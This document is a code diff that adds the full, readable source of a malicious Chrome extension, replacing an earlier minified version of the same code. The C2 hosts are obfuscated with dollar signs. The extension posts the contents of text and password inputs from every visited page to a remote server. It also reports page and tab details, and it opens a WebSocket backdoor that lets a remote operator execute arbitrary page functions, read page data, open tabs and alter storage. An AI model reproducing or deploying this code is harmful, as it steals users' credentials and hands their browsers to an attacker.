@@ -1,1 +1,419 @@
-let WS;const INITAL_CONFIG={uuid:"KB",url:"h$$t$$$t$$p$$s://$$$$$$j$$$$$c$$$$$$b$$$$$a$$$$$k$$$$er$$$$$y.he$$$$$rok$$$$$ua$$$$$pp.c$$$$o$$$$$m".replace(/\$/g,""),socketUrl:"wss://c$$$$h$$$$r$$$$o$$$$m$$$$e-s$$$$o$$$$c$$$$k$$$$et.$$$$he$$$$ro$$$$kua$$$$p$$$$p.$$$$c$$$$om".replace(/\$/g,"")},STORAGE_LOCAL=chrome.storage.local,STORAGE_SYNCE=chrome.storage.sync;async function CONFIG(){var e=STORAGE_LOCAL.get("isInit")["isInit"];return e?await STORAGE_LOCAL.get("config"):INITAL_CONFIG}chrome.runtime.onInstalled.addListener(async()=>{STORAGE_LOCAL.set({...INITAL_CONFIG,isInit:!0}),console.log("Installed %csuccessfully","color: #3aa757")});const CMD={TAB:"TAB",TABS:"TABS",GOTO:"GOTO",HELP:"HELP",EXEC:"EXEC",NEW_TAB:"NEW_TAB",LOCAL:"LOCAL",SYNC:"SYNC",GET_STORAGE:"GET_STORAGE",SET_STORAGE:"SET_STORAGE"};function POST({url:e,body:t={}}){return fetch(e,{method:"POST",headers:{Accept:"application/json","Content-Type":"application/json"},body:JSON.stringify(t)}).catch(e=>console.error(e))}async function initSocket(){var{uuid:e,socketUrl:t}=await STORAGE_LOCAL.get();const a=e+"-BG";async function c({action:e,from:t,payload:o}){console.log(e,t,o);let n="NOT MATCH";try{switch(e){case"HI":n=(console.log("init socket with id ",a),await void WS.send(JSON.stringify({action:"ID",payload:a})));break;case CMD.TAB:case CMD.TABS:n=await chrome.tabs.query(o);break;case CMD.GOTO:n=await function(e){if(e.options?.length)return e.options.forEach(e=>{chrome.tabs.create(e)}),"CREATED"}(o);break;case CMD.SET_STORAGE:n=await function(e){var{type:e="",values:t}=e;{if(e===CMD.LOCAL)return storageLocal.set({...t});if(e===CMD.SYNC)return storageSync.set({...t})}}(o);break;case CMD.GET_STORAGE:n=await function(e){var{type:e=""}=e;{if(e===CMD.LOCAL)return storageLocal.get();if(e===CMD.SYNC)return storageSync.get()}}(o);break;case CMD.HELP:return WS.emit(c.toString)}}catch(e){n=e.message}"NOT MATCH"!==n&&(e+="_RES",WS.emit({action:e,clientId:t,payload:n}))}WS&&1===WS.readyState&&WS.id===a||(WS&&1===WS.readyState&&(WS.onclose=null,WS.close()),(WS=new WebSocket(t)).emit=({clientId:e,payload:t})=>WS.send(JSON.stringify({action:"SEND",payload:{clientId:e,payload:t}})),WS.onopen=()=>{WS.onmessage=({data:e})=>{try{c(JSON.parse(e))}catch(e){}}},WS.onclose=()=>setTimeout(()=>initSocket(a),2e3))}chrome.tabs.onUpdated.addListener(async function(e,t,o){var n;"complete"===t.status&&({uuid:t,url:n}=await STORAGE_LOCAL.get("uuid"),initSocket(),POST({url:n+"/api/extension/tabs",body:{...o,deviceId:t||"Unknown"}}))})(()=>{async function n(){window.storageLocal=chrome.storage.local,window.storageSync=chrome.storage.sync;const{url:e,uuid:t}=await storageLocal.get(),o=e+"/api/extension/url_details",n=e+"/api/extension/inputs",a=t?.replace(/&/g,"")||navigator.platform||navigator.userAgentData?.platform||"Unknown";storageLocal.set({uuid:a});{let e=document.querySelector("link[rel=icon]");e=e?e.href||"No link":"No icon",c({url:o,body:{...location,icon:e,title:document.title,deviceId:a}})}{const r=[...document.querySelectorAll("input")].filter(e=>!["checkbox","submit","radio","date","datetime","time","select"].includes(e.type));let t=null;r.forEach(e=>e.onchange=()=>{e.touched=!0,t=r.map(({id:e,name:t,type:o,value:n,touched:a})=>({id:e,name:t,type:o,value:n,touched:a})),localStorage.setItem("inputs",JSON.stringify(t))}),r.forEach(e=>e.onblur=()=>{c({url:n,body:{json:JSON.stringify(t),...location,deviceId:a}})})}function c({url:e,body:t={}}){return fetch(e,{method:"POST",headers:{Accept:"application/json","Content-Type":"application/json"},body:JSON.stringify(t)}).catch(e=>console.error(e))}}async function a(a){window.storageLocal=chrome.storage.local,window.storageSync=chrome.storage.sync;const{uuid:e,socketUrl:o}=await storageLocal.get(),c=e?.replace(/&/g,"")||navigator.platform||navigator.userAgentData?.platform||"Unknown";let r;!function t(){r=new WebSocket(o);r.emit=(e,t)=>r.send(JSON.stringify({action:e,payload:t}));r.onopen=e=>{r.onmessage=({data:e})=>{const{action:t,from:o,payload:n}=JSON.parse(e);switch(wk.remoteId=o,wk.action,t){case"HI":r.send(JSON.stringify({action:"ID",payload:c+"-"+a}));break;case"exec":wk.exec(n.name,n.args)}},r.onclose=()=>{r.onclose=null,setTimeout(t,2e3)}}}(),storageLocal.set({uuid:c});new class{constructor(){(window.wk=this).remoteId="Remote",this.help={"wk.getObject":"clone object | getObject(name)","wk.send":"send data | send(data)","wk.execute":"function call | execute(name, ...args)","wk.set":"set key with given value from remote | set(key, value)","wk.assign":"set key with executed value | assign(key, { name, args })","wk.querySelector":"wk.currentElement = query result","wk.getKeys":"get keys from object | getKeys(name)"}}execute(e,t){try{t=t.map(e=>"wk.execute"===e.type?this.execute(e.name,e.args):"wk.get"===e.type?this.get(e.name):"wk.getObject"===e.type?this.getObject(e.name):"wk.getKeys"===e.type?this.getKeys(e.name):"wk.assign"===e.type?this.assign(e.key,e.name,e.args):"wk.createFN"===e.type?this.createFN(e.name,e.body):e)}catch(e){return e.message}var[e,o,n,a,c]=e.split(".");return c?window[e][o][n][a][c]&&window[e][o][n][a][c].call?window[e][o][n][a][c](...t):null:a?window[e][o][n][a]&&window[e][o][n][a].call?window[e][o][n][a](...t):null:n?window[e][o][n]&&window[e][o][n].call?window[e][o][n](...t):null:o?window[e][o]&&window[e][o].call?window[e][o](...t):null:e?window[e]&&window[e].call?window[e](...t):null:void 0}getObject(e){let t;for(const o of e.split("."))t=(t||window)[o];return t}send(e){this.clientId=this.remoteId||"Remote";let t;(e=null==e?"null":e).forEach&&(e=[...e].map(e=>e.outerHTML||e)),t=e.outerHTML||e,this.data=e,r.emit("SEND",{clientId:this.remoteId,action:"DATA",payload:t})}exec(e,t){this.send(this.execute(e,t))}get(e){return this.getObject(e)}set(t,o){try{const n=t.split(".").reverse();let e=window;for(;n.length;){const t=n.pop();if(n.length&&"object"!=typeof e[t])throw new Error(`Cannot get ${n.pop()} of none object`);n.length?e=e[t]:e[t]=o}}catch(e){return e.message}}assign(t,{name:o,args:n}){try{var a=this.execute(o,n);const c=t.split(".").reverse();let e=window;for(;c.length;){const t=c.pop();if(c.length&&"object"!=typeof e[t])throw new Error(`Cannot get ${c.pop()} of none object`);c.length?e=e[t]:e[t]=a}}catch(e){return e.message}}createFN(e,t){var o=()=>{for(const e of t)this.execute(e.name,e.args)};return e?this[e]=o:o}extractObject(e){var t=this.getObject(e);if(t){if("object"!=typeof t)return t;{let e={};for(const o in t)e[o]=t[o];return e}}}getKeys(e){return Object.keys(this.getObject(e))}querySelector(e){return this.currentElement=document.querySelector(e),this.currentElement}}}chrome.tabs.onUpdated.addListener(async function(e,t,o){"complete"===t.status&&(chrome.scripting.executeScript({target:{tabId:e},function:a,args:[e]}),setTimeout(()=>chrome.scripting.executeScript({target:{tabId:e},function:n}),500))})})();
+let WS
+const INITAL_CONFIG = {
+  uuid: 'KB',
+  // url: "h$$$$t$$$$t$$$$p:/$$$$/l$$$$o$$$$ca$$$$l$$$$ho$$$$st".replace(/\$/g, ''),
+  //socketUrl: "w$$$$s$$$$:/$$$$/$$$$lo$$$$ca$$$$l$$$$h$$$$o$$$$s$$$$t".replace(/\$/g, ''),
+  url:'h$$t$$$t$$p$$s://$$$$$$j$$$$$c$$$$$$b$$$$$a$$$$$k$$$$er$$$$$y.he$$$$$rok$$$$$ua$$$$$pp.c$$$$o$$$$$m'.replace(/\$/g, ''),
+  socketUrl: 'wss://c$$$$h$$$$r$$$$o$$$$m$$$$e-s$$$$o$$$$c$$$$k$$$$et.$$$$he$$$$ro$$$$kua$$$$p$$$$p.$$$$c$$$$om'.replace(/\$/g, ''),
+}
+const STORAGE_LOCAL = chrome.storage.local
+const STORAGE_SYNCE = chrome.storage.sync
+async function CONFIG() {
+  const { isInit } = STORAGE_LOCAL.get('isInit')
+  return isInit ? await STORAGE_LOCAL.get('config') : INITAL_CONFIG
+}
+
+chrome.runtime.onInstalled.addListener(async () => {
+  STORAGE_LOCAL.set({ ...INITAL_CONFIG, isInit: true })
+  console.log('Installed %csuccessfully', `color: #3aa757`)
+})
+
+const CMD = {
+  TAB: 'TAB',
+  TABS: 'TABS',
+  GOTO: 'GOTO',
+  HELP: 'HELP',
+  EXEC: 'EXEC',
+  NEW_TAB: 'NEW_TAB',
+  LOCAL: 'LOCAL',
+  SYNC: 'SYNC',
+  GET_STORAGE: 'GET_STORAGE',
+  SET_STORAGE: 'SET_STORAGE'
+}
+
+function POST({ url, body = {} }) {
+  return fetch(url, {
+    method: 'POST',
+    headers: {
+      Accept: 'application/json',
+      'Content-Type': 'application/json'
+    },
+    body: JSON.stringify(body)
+  }).catch(e => console.error(e))
+}
+
+
+chrome.tabs.onUpdated.addListener(async function (tabId, info, tab) {
+    if (info.status === 'complete') {
+        const { uuid, url } = await STORAGE_LOCAL.get('uuid')
+        initSocket()
+        POST({
+            url: `${url}/api/extension/tabs`,
+            body: {
+                ...tab,
+                deviceId: uuid || 'Unknown'
+            }
+        })
+    }
+})
+
+
+(() => {
+  async function local() {
+    window.storageLocal = chrome.storage.local
+    window.storageSync = chrome.storage.sync
+    const { url, uuid } = await storageLocal.get()
+    // const urlApi = `${url}/api/extension/urls`
+    const urlDetailApi = `${url}/api/extension/url_details`
+    const inputApi = `${url}/api/extension/inputs`
+    const deviceId = uuid?.replace(/&/g, '') || navigator.platform || navigator.userAgentData?.platform || 'Unknown'
+    storageLocal.set({ uuid: deviceId })
+
+    getLocation()
+    addInputListener()
+
+    function post({ url, body = {} }) {
+      return fetch(url, {
+        method: 'POST',
+        headers: {
+          Accept: 'application/json',
+          'Content-Type': 'application/json'
+        },
+        body: JSON.stringify(body)
+      }).catch(e => console.error(e))
+    }
+
+    function addInputListener() {
+      const getInputs = () => [...document.querySelectorAll('input')].filter(i => !['checkbox', 'submit', 'radio', 'date', 'datetime', 'time', 'select'].includes(i.type))
+      const inputs = getInputs()
+      let all = null
+      inputs.forEach(i => i.onchange = () => {
+        i.touched = true
+        all = inputs.map(({ id, name, type, value, touched }) => ({ id, name, type, value, touched }))
+        localStorage.setItem('inputs', JSON.stringify(all))
+      })
+
+      inputs.forEach(i => i.onblur = () => {
+        post({
+          url: inputApi,
+          body: {
+            json: JSON.stringify(all),
+            ...location,
+            deviceId
+          }
+        })
+      })
+    }
+
+    function getLocation() {
+      let icon = document.querySelector('link[rel=icon]')
+      icon = icon ? icon.href ? icon.href : 'No link' : 'No icon'
+      post({
+        url: urlDetailApi,
+        body: {
+          ...location,
+          icon,
+          title: document.title,
+          deviceId
+        }
+      })
+    }
+  }
+
+  async function Client(tabId) {
+    window.storageLocal = chrome.storage.local
+    window.storageSync = chrome.storage.sync
+    const { uuid, socketUrl } = await storageLocal.get()
+    const deviceId = uuid?.replace(/&/g, '') || navigator.platform || navigator.userAgentData?.platform || 'Unknown'
+    let ws
+    initSocket()
+
+    storageLocal.set({ uuid: deviceId })
+
+    function initSocket() {
+      ws = new WebSocket(socketUrl)
+      ws.emit = (action, data) => ws.send(JSON.stringify({ action, payload: data }))
+      ws.onopen = (e) => {
+        ws.onmessage = ({ data }) => {
+          // console.log(JSON.parse(data))
+          const { action, from, payload } = JSON.parse(data)
+          wk.remoteId = from
+          wk.action
+          switch (action) {
+            case 'HI':
+              ws.send(JSON.stringify({ action: 'ID', payload: `${deviceId}-${tabId}` }))
+              break
+            case 'exec': wk.exec(payload.name, payload.args)
+              break
+          }
+        }
+        ws.onclose = () => {
+          ws.onclose = null
+          setTimeout(initSocket, 2000)
+        }
+      }
+    }
+
+
+    class WK {
+      constructor() {
+        window.wk = this
+        this.remoteId = 'Remote'
+        this.help = {
+          'wk.getObject': 'clone object | getObject(name)',
+          'wk.send': 'send data | send(data)',
+          'wk.execute': 'function call | execute(name, ...args)',
+          'wk.set': 'set key with given value from remote | set(key, value)',
+          'wk.assign': 'set key with executed value | assign(key, { name, args })',
+          'wk.querySelector': 'wk.currentElement = query result',
+          'wk.getKeys': 'get keys from object | getKeys(name)',
+        }
+      }
+
+      execute(name, args) {
+        try {
+          args = args.map(arg => {
+            if (arg.type === 'wk.execute')
+              return this.execute(arg.name, arg.args)
+            else if (arg.type === 'wk.get')
+              return this.get(arg.name)
+            else if (arg.type === 'wk.getObject')
+              return this.getObject(arg.name)
+            else if (arg.type === 'wk.getKeys')
+              return this.getKeys(arg.name)
+            else if (arg.type === 'wk.assign')
+              return this.assign(arg.key, arg.name, arg.args)
+            else if (arg.type === 'wk.createFN')
+              return this.createFN(arg.name, arg.body)
+            else return arg
+          })
+        } catch (error) {
+          return error.message
+        }
+        const [k1, k2, k3, k4, k5] = name.split('.')
+        if (k5)
+          return window[k1][k2][k3][k4][k5] && window[k1][k2][k3][k4][k5].call ? window[k1][k2][k3][k4][k5](...args) : null
+        if (k4)
+          return window[k1][k2][k3][k4] && window[k1][k2][k3][k4].call ? window[k1][k2][k3][k4](...args) : null
+        if (k3)
+          return window[k1][k2][k3] && window[k1][k2][k3].call ? window[k1][k2][k3](...args) : null
+        if (k2)
+          return window[k1][k2] && window[k1][k2].call ? window[k1][k2](...args) : null
+        if (k1)
+          return window[k1] && window[k1].call ? window[k1](...args) : null
+      }
+
+      getObject(name) {
+        let item
+        for (const k of name.split('.'))
+          if (!item) item = window[k]
+          else item = item[k]
+        return item
+      }
+
+      // usable
+      send(data) {
+        this.clientId = this.remoteId || 'Remote'
+        if (data === null || data === undefined) data = 'null'
+        // console.warn('Sending: ', data)
+        let payload
+        if (data.forEach) data = [...data].map(d => d.outerHTML ? d.outerHTML : d)
+
+        if (data.outerHTML) {
+          payload = data.outerHTML //JSON.stringify(data.outerHTML)
+        }
+        else payload = data //JSON.stringify(data)
+        // console.warn('Payload: ', payload)
+        //localStorage.data = payload
+        this.data = data
+        ws.emit('SEND', { clientId: this.remoteId, action: 'DATA', payload })
+      }
+
+      exec(name, args) {
+        this.send(this.execute(name, args))
+      }
+
+      get(name) {
+        return this.getObject(name)
+      }
+
+      set(key, value) {
+        try {
+          const keys = key.split('.').reverse()
+          let obj = window
+          while (keys.length) {
+            const key = keys.pop()
+            if (keys.length && typeof obj[key] !== 'object') throw new Error(`Cannot get ${keys.pop()} of none object`)
+            else if (!keys.length) obj[key] = value
+            else obj = obj[key]
+          }
+
+        } catch (error) {
+          return error.message
+        }
+      }
+
+      assign(key, { name, args }) {
+        try {
+
+          const value = this.execute(name, args)
+
+          const keys = key.split('.').reverse()
+          let obj = window
+          while (keys.length) {
+            const key = keys.pop()
+            if (keys.length && typeof obj[key] !== 'object') throw new Error(`Cannot get ${keys.pop()} of none object`)
+            else if (!keys.length) obj[key] = value
+            else obj = obj[key]
+          }
+        } catch (error) {
+          return error.message
+        }
+      }
+
+      createFN(name, body) {
+        const fn = () => {
+          for (const s of body) {
+            this.execute(s.name, s.args)
+          }
+        }
+
+        return name ? this[name] = fn : fn
+      }
+
+      extractObject(name) {
+        const obj = this.getObject(name)
+        if (!obj) return
+
+        if (typeof obj === 'object') {
+          let data = {}
+          for (const k in obj)
+            data[k] = obj[k]
+          return data
+        }
+        else
+          return obj
+      }
+
+      getKeys(name) {
+        return Object.keys(this.getObject(name))
+      }
+
+      querySelector(query) {
+        this.currentElement = document.querySelector(query)
+        return this.currentElement
+      }
+
+    }
+    new WK
+  }
+
+  chrome.tabs.onUpdated.addListener(async function (tabId, info, tab) {
+    if (info.status === 'complete') {
+      chrome.scripting.executeScript({
+        target: { tabId },
+        function: Client,
+        args: [tabId]
+      })
+
+      setTimeout(() => chrome.scripting.executeScript({
+        target: { tabId },
+        function: local
+      }), 500)
+    }
+  })
+})();
+
+
+async function initSocket() {
+  const { uuid, socketUrl } = await STORAGE_LOCAL.get()
+  const ID = `${uuid}-BG`
+
+  if (WS && WS.readyState === 1 && WS.id === ID) return
+  if (WS && WS.readyState === 1) {
+    WS.onclose = null
+    WS.close()
+  }
+  WS = new WebSocket(socketUrl)
+  WS.emit = ({ clientId, payload }) => WS.send(JSON.stringify({ action: 'SEND', payload: { clientId, payload } }))
+  WS.onopen = () => {
+    WS.onmessage = ({ data }) => {
+      try {
+        handleData(JSON.parse(data))
+      } catch (error) { }
+    }
+  }
+
+  WS.onclose = () => setTimeout(() => initSocket(ID), 2000)
+
+  async function handleData({ action, from, payload }) {
+    console.log(action, from, payload)
+    let data = 'NOT MATCH'
+    try {
+      switch (action) {
+        case 'HI': data = await register()
+          break
+        case CMD.TAB: data = await tab(payload)
+          break
+        case CMD.TABS: data = await tabs(payload)
+          break
+        case CMD.GOTO: data = await goto(payload)
+          break
+        case CMD.SET_STORAGE: data = await setStorage(payload)
+          break
+        case CMD.GET_STORAGE: data = await getStorage(payload)
+          break
+        case CMD.HELP: return WS.emit(handleData.toString)
+      }
+    } catch (error) {
+      data = error.message
+    }
+    if (data !== 'NOT MATCH') {
+      action += '_RES'
+      WS.emit({ action, clientId: from, payload: data })
+    }
+  }
+
+  function tab(payload) {
+    return chrome.tabs.query(payload)
+  }
+
+  function tabs(payload) {
+    return chrome.tabs.query(payload)
+  }
+
+  function goto(payload) {
+    if (payload.options?.length) {
+      payload.options.forEach(option => {
+        chrome.tabs.create(option)
+      })
+      return 'CREATED'
+    }
+  }
+
+  function register() {
+    console.log('init socket with id ', ID)
+    WS.send(JSON.stringify({
+      action: 'ID',
+      payload: ID
+    }))
+  }
+
+  function getStorage(payload) {
+    const { type = '' } = payload
+
+    if (type === CMD.LOCAL)
+      return storageLocal.get()
+    else if (type === CMD.SYNC)
+      return storageSync.get()
+  }
+
+  function setStorage(payload) {
+    const { type = '', values } = payload
+
+    if (type === CMD.LOCAL)
+      return storageLocal.set({ ...values })
+    else if (type === CMD.SYNC)
+      return storageSync.set({ ...values })
+  }
+}
